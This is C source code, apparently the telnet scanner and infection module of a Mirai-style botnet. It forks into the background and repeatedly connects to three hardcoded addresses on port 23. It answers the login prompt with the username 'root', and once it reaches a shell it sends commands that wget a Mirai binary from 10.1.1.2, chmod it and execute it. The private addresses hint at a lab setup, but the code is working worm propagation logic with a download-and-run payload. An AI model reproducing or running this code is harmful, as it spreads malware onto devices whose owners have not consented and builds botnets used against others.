
#include "scanner.h"
 

int _pid;
 
void negotiate(int sock, unsigned char *buf, int len) {
    int i;
     
    if (buf[1] == DO && buf[2] == CMD_WINDOW_SIZE) {
        unsigned char tmp1[10] = {255, 251, 31};
        if (send(sock, tmp1, 3 , 0) < 0)
            exit(1);
         
        unsigned char tmp2[10] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
        if (send(sock, tmp2, 9, 0) < 0)
            exit(1);
        return;
    }
     
    for (i = 0; i < len; i++) {
        if (buf[i] == DO)
            buf[i] = WONT;
        else if (buf[i] == WILL)
            buf[i] = DO;
    }
 
    if (send(sock, buf, len , 0) < 0)
        exit(1);
}
 
static struct termios tin;
 
/*static void terminal_set(void) {
    // save terminal configuration
    tcgetattr(STDIN_FILENO, &tin);
     
    static struct termios tlocal;
    memcpy(&tlocal, &tin, sizeof(tin));
    cfmakeraw(&tlocal);
    tcsetattr(STDIN_FILENO,TCSANOW,&tlocal);
}*/
 
/*static void terminal_reset(void) {
    // restore terminal upon exit
    tcsetattr(STDIN_FILENO,TCSANOW,&tin);
}*/
 
#define BUFLEN 20
int scanner_init(void) {

	_pid = fork();
    if (_pid > 0 || _pid == -1)
        return 0;
    int add = 0;
    while(1){
    int sock;
    struct sockaddr_in server;
    unsigned char buf[BUFLEN + 1];
    int len;
    int i;
    int ro = 0;
    int inf = 0;
    
   	int trW = 0;
    
 
   
    int port = 23;
    add = add + 1;
  
    //Create socket
    sock = socket(AF_INET , SOCK_STREAM , 0);
    if (sock == -1) {
        perror("Could not create socket. Error");
        continue;
    }
 	//int addinf = 1;
 	//int addsup = 3;
 	//int add = (rand()% addsup + addinf);
 	//add = 2;
 	
 	if(add == 4){
 		add = 1;
 	}
 	switch(add){
 		case 1: 
 			server.sin_addr.s_addr = inet_addr("10.1.1.11");
 			break;
 		case 2:
 			server.sin_addr.s_addr = inet_addr("10.1.1.12");
 			break;
 		case 3:
 			server.sin_addr.s_addr = inet_addr("10.1.1.13");
 			break;
 		}
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
 
    //Connect to remote server
    if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0) {
        perror("connect failed. Error");
        close(sock);
        continue;
    }
    puts("Connected...\n");
 
    // set terminal
    //terminal_set();
    //atexit(terminal_reset);
     
    struct timeval ts;
    ts.tv_sec = 1; // 1 second
    ts.tv_usec = 0;
 
    while (1) {
        // select setup
        fd_set fds;
        FD_ZERO(&fds);
        if (sock != 0)
            FD_SET(sock, &fds);
        FD_SET(0, &fds);
 
        // wait for data
        int nready = select(sock + 1, &fds, (fd_set *) 0, (fd_set *) 0, &ts);
        puts("Connected1...\n");
        if (nready < 0) {
            perror("select. Error");
            close(sock);
            break;
        }
        else if (nready == 0) {
            ts.tv_sec = 1; // 1 second
            ts.tv_usec = 0;
        }
        else if (sock != 0 && FD_ISSET(sock, &fds)) {
            // start by reading a single byte
            puts("Connected2...\n");
            int rv;
            if ((rv = recv(sock , buf , 1 , 0)) < 0){
            	close(sock);
                break;
            }else if (rv == 0) {
                printf("Connection closed by the remote end\n\r");
                close(sock);
                break;
            }
 
            if (buf[0] == CMD) {
            	puts("Connected3...\n");
                // read 2 more bytes
                len = recv(sock , buf + 1 , 2 , 0);
                if (len  < 0){
                	close(sock);
                    break;
                }else if (len == 0) {
                    printf("Connection closed by the remote end\n\r");
                    close(sock);
                    break;
                }
                negotiate(sock, buf, 3);
                puts("Connected3...\n");
            }
            else {
                len = 1;
                buf[len] = '\0';
                if(strcmp(":",buf) == 0 && ro<2){
                	char c1[5] = "root";
                	char c2[6] = "admin";
                	c1[4]='\n';
             
                	if(send(sock, c1, 5, 0)<0){
                		close(sock);
                		break;
                	}
                	ro = ro + 1;
                }
                if(strcmp("L",buf) == 0 && trW == 0 && ro >= 2){
                	puts("wrong username or password\n");
                	close(sock);
                	break;
                }
                if(strcmp("W",buf) == 0){
                	trW = 1;
                }
                if(strcmp("#",buf) == 0 && inf==0){
                	char infe[49] = "wget http://10.1.1.2/bins/mirai.dbg -O dvrHelper";
                	infe[48] = '\n';
                	if(send(sock, infe, 49, 0)<0){
                		close(sock);
                		break;
                	}
                	inf = inf + 1;
                }
                
                if(strcmp("#",buf) == 0 && inf==1){
                	char infe[20] = "chmod 777 dvrHelper";
                	infe[19] = '\n';
                	if(send(sock, infe, 20, 0)<0){
                		close(sock);
                		break;
                	}
                	inf = inf + 1;
                }
                if(strcmp("#",buf) == 0 && inf==2){
                	char infe[14] = "./dvrHelper &";
                	infe[13] = '\n';
                	if(send(sock, infe, 14, 0)<0){
                		close(sock);
                		break;
                	}
                	sleep(1);
                	close(sock);
                	break;

                	inf = inf + 1;
                }
                printf("%s", buf);
                fflush(0);
            }
        }
         
        /*else if (FD_ISSET(0, &fds)) {
        	puts("Connected4...\n");
            buf[0] = getc(stdin); //fgets(buf, 1, stdin);
            if (send(sock, buf, 1, 0) < 0)
                rexit(1);
            if (buf[0] == '\n') // with the terminal in raw mode we need to force a LF
                putchar('\r');
        }*/
    }
    }
    exit(0);
}

void scanner_kill(void){
	kill(_pid,9);
}
